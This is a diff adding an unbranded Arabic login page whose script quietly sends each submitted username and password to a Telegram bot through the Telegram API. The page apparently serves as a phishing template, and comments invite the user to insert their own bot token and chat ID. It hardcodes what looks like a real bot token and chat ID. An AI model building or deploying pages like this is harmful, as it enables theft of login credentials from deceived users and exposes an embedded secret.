@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #444;
+            border-radius: 4px;
+            background-color: #1e1e1e;
+            color: #ffffff;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #66bb6a;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #66bb6a;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .submit-btn:hover {
+            background-color: #55aa59;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="username">اسم المستخدم:</label>
+            <input type="text" id="username" name="username" required>
+        </div>
+        <div class="input-group">
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+        <button type="submit" class="submit-btn">إرسال</button>
+    </form>
+</div>
+
+<script>
+// قم بتغيير القيم التالية بتوكن بوتك الخاص بك ومعرف الدردشة
+const TELEGRAM_BOT_TOKEN = '8104735798:AAGstSFp66i5aG0-uKofVqWWiIbLbE5wpjA'; // هنا قم بتغييره بتوكن بوتك الخاص بك
+const CHAT_ID = '1346665329'; // هنا قم بتغييره بمعرف الدردشة الخاص بك
+
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // منع السلوك الافتراضي للنموذج
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+
+    // إرسال البيانات إلى بوت تيليجرام
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('تم إرسال البيانات بنجاح!');
+        } else {
+            alert('حدث خطأ أثناء إرسال البيانات.');
+        }
+    })
+    .catch(error => {
+        console.error('حدث خطأ:', error);
+        alert('حدث خطأ أثناء إرسال البيانات.');
+    });
+});
+</script>
+
+</body>
+</html>
